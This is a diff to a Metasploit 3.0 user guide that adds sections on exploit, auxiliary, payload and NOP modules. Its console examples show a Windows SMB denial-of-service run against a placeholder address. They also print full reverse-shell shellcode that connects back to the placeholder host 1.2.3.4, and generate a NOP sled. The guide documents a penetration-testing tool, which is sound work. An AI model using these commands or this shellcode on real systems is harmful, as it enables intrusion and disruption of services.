@@ -319,26 +319,39 @@ of log messages.  Only use this when much additional information is required.
 
 \chapter{Using the Framework}
 
-	\section{Choosing an Exploit Module}
+	\section{Choosing a Module}
 \par
-From the \texttt{msfconsole} interface, you may view the available exploit
-modules through with the \texttt{show exploits} command. Select an exploit
-with the \texttt{use} command, specifying the short module name as the
-argument. The \texttt{info} command can be used to view information about a
-specific exploit module. 
+From the \texttt{msfconsole} interface, you can view the list of modules that
+are available for you to interact with.  You can see all available modules
+through the \texttt{show all} command.  To see the list of modules of a
+particular type you can use the \texttt{show moduletype} command, where
+\textit{moduletype} is any one of exploits, encoders, payloads, and so on.  
+You can select a module with the \texttt{use} command by specifying the
+module's name as the argument.  The \texttt{info} command can be used to view
+information about a module without using it.  Unlike Metasploit 2.x, the new
+version of Metasploit supports interacting with each different module types
+through the \texttt{use} command.  In Metasploit 2.x, only exploit modules
+could be interacted with.
 
-	\section{Configuring the Active Exploit}
+	\section{Exploit Modules}
 
-\par Once you have selected an exploit, the next step is to determine what
-options it requires. This can be accomplished with the \texttt{show options}
-command. Most exploits use \texttt{RHOST} to specify the target address and
-\texttt{RPORT} to set the target port. Use the \texttt{set} command to
-configure the appropriate values for all required options. If you have any
-questions about what a given option does, refer to the module source code.
-Advanced options are available with some exploit modules, these can be viewed
-with the \texttt{show advanced} command. 
+\par
+Exploit modules are the defacto module in Metasploit which are used to
+encapsulate an exploit.
 
-	\section{Verifying the Exploit Options}
+		\subsection{Configuring the Active Exploit}
+
+\par 
+Once you have selected an exploit with the \texttt{use} command, the next step
+is to determine what options it requires. This can be accomplished with the
+\texttt{show options} command. Most exploits use \texttt{RHOST} to specify the
+target address and \texttt{RPORT} to set the target port. Use the \texttt{set}
+command to configure the appropriate values for all required options. If you
+have any questions about what a given option does, refer to the module source
+code.  Advanced options are available with some exploit modules, these can be
+viewed with the \texttt{show advanced} command. 
+
+		\subsection{Verifying the Exploit Options}
 
 \par	The \texttt{check} command can be used to determine whether the target
 system is vulnerable to the active exploit module. This is a quick way to
@@ -350,7 +363,7 @@ whether a service is vulnerable without actually exploiting it. A
 becoming unavailable. Many modules simply display version information and
 expect you to analyze it before proceeding.  
 
-	\section{Selecting a Target}
+		\subsection{Selecting a Target}
 
 \par Many exploits will require the \texttt{TARGET} environment variable to be
 set to the index number of the desired target. The \texttt{show targets}
@@ -358,7 +371,7 @@ command will list all targets provided by the exploit module. Many exploits
 will default to a brute-force target type; this may not be desirable in all
 situations. 
 
-	\section{Selecting the Payload}
+		\subsection{Selecting the Payload}
 
 \par	The payload is the actual code that will run on the target system after
 a successful exploit attempt. Use the \texttt{show payloads} command to list
@@ -380,11 +393,150 @@ exploit, even if it not compatible with your currently selected
 \texttt{TARGET}. For example, if you select a Linux target, yet choose a BSD
 payload, you should not expect the exploit to work.
 
-	\section{Launching the Exploit}
+		\subsection{Launching the Exploit}
 
 \par The \texttt{exploit} command will launch the attack. If everything went
 well, your payload will execute and potentially provide you with an
 interactive command shell on the exploited system. 
+
+	\section{Auxiliary Modules}
+
+\par
+Metasploit 3.0 supports the concept of auxiliary modules which can be used to
+perform arbitrary, one-off actions such as port scanning, denial of service,
+and even fuzzing.
+	
+		\subsection{Running an Auxiliary Task}
+
+\par
+Auxiliary modules are quite a bit similar to exploit modules.  Instead of
+having targets, they have actions, which are specified through the
+\texttt{ACTION} option.  To run an auxiliary module, you can either use the
+\texttt{run} command, or you can use the \texttt{exploit} command -- they're
+both the same thing.
+
+\begin{verbatim}
+msf > use dos/windows/smb/ms06_035_mailslot
+msf auxiliary(ms06_035_mailslot) > set RHOST 1.2.3.4
+RHOST => 1.2.3.4
+msf auxiliary(ms06_035_mailslot) > run
+[*] Mangling the kernel, two bytes at a time...
+\end{verbatim} 
+
+	\section{Payload Modules}
+
+\par
+Payload modules encapsulate the arbitrary code (shellcode) that is executed as
+the result of an exploit succeeding.  Payloads typically build a communication
+channel between Metasploit and the victim host.
+
+		\subsection{Generating a Payload}
+
+\par
+The console interface supports generating different forms of a payload.  This
+is a new feature in Metasploit 3.0.  To generate payloads, first select a
+payload through the \texttt{use} command.
+
+\begin{verbatim}
+msf > use windows/shell_reverse_tcp
+msf payload(shell_reverse_tcp) > generate -h
+Usage: generate [options]
+
+Generates a payload.
+
+OPTIONS:
+
+    -b <opt>  The list of characters to avoid: '\x00\xff'
+    -e <opt>  The name of the encoder module to use.
+    -h        Help banner.
+    -o <opt>  A comma separated list of options in VAR=VAL format.
+    -s <opt>  NOP sled length.
+    -t <opt>  The output type: ruby, perl, c, or raw.
+
+msf payload(shell_reverse_tcp) >  
+\end{verbatim}
+
+\par
+Using the options supported by the \texttt{generate} command, different
+formats of a payload can be generated.  Some payloads will require options
+which can be specified through the \texttt{-o} parameter.  Additionally, a
+format to convey the generated payload can be specified through the
+\texttt{-t} parameter.  
+
+\begin{verbatim}
+msf payload(shell_reverse_tcp) > set LHOST 1.2.3.4
+LHOST => 1.2.3.4
+msf payload(shell_reverse_tcp) > generate -t ruby
+# windows/shell_reverse_tcp - 287 bytes
+# http://www.metasploit.com
+# EXITFUNC=seh, LPORT=4444, LHOST=1.2.3.4
+"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24" +
+"\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f" +
+"\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84" +
+"\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28" +
+"\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c" +
+"\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc3\x31\xdb\x64" +
+"\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e" +
+"\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32" +
+"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50" +
+"\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff" +
+"\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43" +
+"\x53\x43\x53\xff\xd0\x68\x01\x02\x03\x04\x66\x68\x11\x5c" +
+"\x66\x53\x89\xe1\x95\x68\xec\xf9\xaa\x60\x57\xff\xd6\x6a" +
+"\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68\x63\x6d\x6a\x50" +
+"\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\x95" +
+"\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab" +
+"\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51" +
+"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05" +
+"\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6" +
+"\x79\xff\x75\x04\xff\xd6\xff\x77\xfc\xff\xd0\x68\xf0\x8a" +
+"\x04\x5f\x53\xff\xd6\xff\xd0"
+msf payload(shell_reverse_tcp) >  
+\end{verbatim}
+
+	\section{Nop Modules}
+
+\par
+NOP modules are used to generate no-operation instructions that can be used
+for padding out buffers.
+
+		\subsection{Generating a NOP Sled}
+
+\par
+The NOP module console interface supports generating a NOP sled of an
+arbitrary size and displaying it in a given format through the
+\texttt{generate} command.
+
+\begin{verbatim}
+msf > use x86/opty2
+msf nop(opty2) > generate -h
+Usage: generate [options] length
+
+Generates a NOP sled of a given length.
+
+OPTIONS:
+
+    -b <opt>  The list of characters to avoid: '\x00\xff'
+    -h        Help banner.
+    -s <opt>  The comma separated list of registers to save.
+    -t <opt>  The output type: ruby, perl, c, or raw.
+
+msf nop(opty2) >     
+\end{verbatim}
+
+\par
+To generate a 50 byte NOP sled that is displayed as a C-style buffer, the
+following command can be run:
+
+\begin{verbatim}
+msf nop(opty2) > generate -t c 50
+unsigned char buf[] =
+"\xf5\x3d\x05\x15\xf8\x67\xba\x7d\x08\xd6\x66\x9f\xb8\x2d\xb6"
+"\x24\xbe\xb1\x3f\x43\x1d\x93\xb2\x37\x35\x84\xd5\x14\x40\xb4"
+"\xb3\x41\xb9\x48\x04\x99\x46\xa9\xb0\xb7\x2f\xfd\x96\x4a\x98"
+"\x92\xb5\xd4\x4f\x91";
+msf nop(opty2) >   
+\end{verbatim}
 
 \pagebreak
 \chapter{Advanced Features}
